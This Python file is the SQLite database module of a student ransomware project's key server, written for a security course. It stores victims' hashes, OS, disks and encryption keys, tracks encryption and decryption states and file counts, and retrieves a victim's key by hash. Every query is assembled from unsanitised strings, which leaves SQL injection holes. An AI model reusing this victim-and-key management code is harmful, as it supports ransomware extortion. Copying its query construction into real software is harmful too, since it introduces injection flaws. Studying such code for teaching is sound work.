# --------------------------------------------
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : data
# --------------------------------------------
# Importations
# --------------------------------------------
import sqlite3
import time

DB_FILENAME = 'serveur_cles/data/victims.sqlite'
DEBUG_MODE = False


def connect_db():
    """
    Cette fonction établit une connexion à la base de données SQLite en utilisant
    le nom de fichier défini dans DB_FILENAME. Si la connexion est réussie,
    elle renvoie l'objet de connexion.
    """
    sqlite_connection = None
    try:
        sqlite_connection = sqlite3.connect(DB_FILENAME)
    except sqlite3.Error as error:
        print("Failed to connect database", DB_FILENAME, error)
    finally:
        if sqlite_connection:
            return sqlite_connection


def insert_data(conn, table, items, data):
    """
    Cette fonction insère des données dans la table spécifiée de la base de données.
    Les paramètres conn, table, items et data sont utilisés pour construire la
    requête d'insertion. Si DEBUG_MODE est activé, la requête est affichée avant
    l'exécution. Après l'insertion, la fonction effectue un commit pour
    sauvegarder les modifications.
    """
    insert_query = "INSERT INTO " + table + " " + items + " VALUES " + data
    if DEBUG_MODE:
        print(insert_query)

    try:
        cursor = conn.cursor()
        cursor.execute(insert_query)
        if DEBUG_MODE:
            print(f"Record inserted successfully into {DB_FILENAME}.{table} table ", cursor.rowcount)
        conn.commit()
        cursor.close()
    except sqlite3.Error as error:
        print("Failed to insert data into sqlite table", error)


def select_data(conn, select_query):
    """
    Cette fonction exécute une requête de sélection sur la base de données en
    utilisant la requête spécifiée. Si DEBUG_MODE est activé, la requête est
    affichée avant l'exécution.
    Les résultats de la requête sont renvoyés sous forme de liste de tuples.
    """
    if DEBUG_MODE:
        print(select_query)

    try:
        cursor = conn.cursor()
        cursor.execute(select_query)
        records = cursor.fetchall()
        cursor.close()

    except sqlite3.Error as error:
        print("Failed to read data from sqlite table", error)
    else:
        return records


def select_data_script(conn, select_query):
    """
    Cette fonction est similaire à select_data(), mais elle est utilisée lorsque
    la requête spécifiée est un script SQL plutôt qu'une simple requête de sélection.
    """
    if DEBUG_MODE:
        print(select_query)

    try:
        cursor = conn.cursor()
        cursor.executescript(select_query)
        records = cursor.fetchall()
        cursor.close()

    except sqlite3.Error as error:
        print("Failed to read data from sqlite table", error)
    else:
        return records

        
def list_victims(conn):
    """
    Cette fonction récupère une liste de toutes les victimes à partir de la base
    de données. La requête SQL utilise une sous-requête pour obtenir l'état le
    plus récent de chaque victime.
    """
    # victims contient la liste de toutes les victimes (id_victim, hash, os, disks, state)
    query = '''
    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
    FROM (SELECT id_victim, MAX(datetime), state AS last_state
    FROM states
    GROUP BY id_victim) AS last_states
    INNER JOIN victims ON victims.id_victim = last_states.id_victim
    '''
    victims = select_data(conn, query)  # victims[n][victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state ]

    # victims_list contient la liste de toutes les victimes (id_victim, hash, os, disks, state, nb_files)
    i = 0
    victims_list = []
    for victim in victims:
        victims_list.append(list(victim))
        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
            query = f'''
            SELECT encrypted.nb_files
            FROM encrypted
            WHERE encrypted.id_victim = {victim[0]}
              AND encrypted.datetime = (SELECT MAX(datetime) 
                                          FROM encrypted 
                                         WHERE id_victim = {victim[0]})
            '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            victims_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
        elif victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
            query = f'''
            SELECT decrypted.nb_files
            FROM decrypted
            WHERE decrypted.id_victim = {victim[0]}
              AND decrypted.datetime = (SELECT MAX(datetime) 
                                          FROM decrypted 
                                         WHERE id_victim = {victim[0]})
            '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            victims_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
        else:
            victims_list[i].append(0)   # ajout du 0 pour le cas INITIALIZE
        i += 1

    return victims_list


# Define a function to insert victim information into the database
def insert_victim_new(conn, hash_victim, os_victim, disk_victim, key_victim):
    """
    Enregistre une nouvelle victime dans la DB
    :param conn: Connexion à la DB
    :param hash_victim:
    :param os_victim:
    :param disk_victim:
    :param key_victim:
    :return: (int) le nouvel id_victim en DB
    """
    current_date = int(time.time())
    # Enregistrement de la nouvelle victime
    data_victim = (os_victim, hash_victim, disk_victim, key_victim)
    insert_data(conn, 'victims', '(os, hash, disks, key)', f'{data_victim}')

    # Récupère l'ID de la nouvelle victime
    query = f'''
    SELECT victims.id_victim
    from victims
    where victims.hash = "{hash_victim}"
    '''
    id_victim = select_data(conn, query)
    id_victim = id_victim[0][0]

    # Enregistrement de l'état INITIALIZE
    data_state = (id_victim, current_date, 'INITIALIZE')
    insert_data(conn, 'states', '(id_victim, datetime, state)', f'{data_state}')

    return id_victim


def history_req(conn, id_victim):
    """
    Cette fonction récupère l'historique des états pour une victime spécifiée par son ID.
    """
    # histories contient la liste de tous les historiques d'état (id_victim, datetime, state)
    query = f'''
        SELECT states.id_victim, states.datetime, states.state
        FROM states
        WHERE states.id_victim = {id_victim}
        '''
    histories = select_data(conn, query)

    # histories_list contient la liste de tous les historiques d'état (id_victim, datetime, state, nb_files)
    i = 0
    histories_list = []
    for history in histories:
        histories_list.append(list(history))
        if history[2] == 'CRYPT' or history[2] == 'PENDING':
            query = f'''
                SELECT encrypted.nb_files
                FROM encrypted
                WHERE encrypted.id_victim = {history[0]}
                  AND encrypted.datetime = {history[1]}
                '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            histories_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
        elif history[2] == 'DECRYPT' or history[2] == 'PROTECTED':
            query = f'''
                SELECT decrypted.nb_files
                FROM decrypted
                WHERE decrypted.id_victim = {history[0]}
                  AND decrypted.datetime = {history[1]}
                '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            histories_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
        else:
            histories_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
        i += 1

    return histories_list


def change_state(conn, id_victim):
    """
    Cette fonction insère un nouvel état "DECRYPT" pour la victime spécifiée par son ID dans la table "states".
    """
    insert_data(conn, 'states', '(id_victim, datetime, state)', f"({id_victim}, {int(time.time())}, 'DECRYPT')")
    return f'State for id:{id_victim} has been changed.'


def check_hash(conn, hash_v):
    """
    Cette fonction vérifie si un hachage de victime existe dans la base de données.
    Si le hachage est trouvé, elle récupère l'ID de la victime, sa clé et son
    dernier état à partir des tables correspondantes.
    """
    rq = f'''
    SELECT victims.id_victim, victims.key
    FROM victims
    WHERE victims.hash = "{hash_v}"
    '''
    victim = select_data(conn, rq)
    if not victim:
        return None
    else:
        victim = list(victim[0])
        query = f'''
        SELECT states.state, MAX(states.datetime)
        FROM states
        WHERE states.id_victim = {victim[0]}
        '''
        last_state = (select_data(conn, query))[0][0]
        victim.append(last_state)
        return victim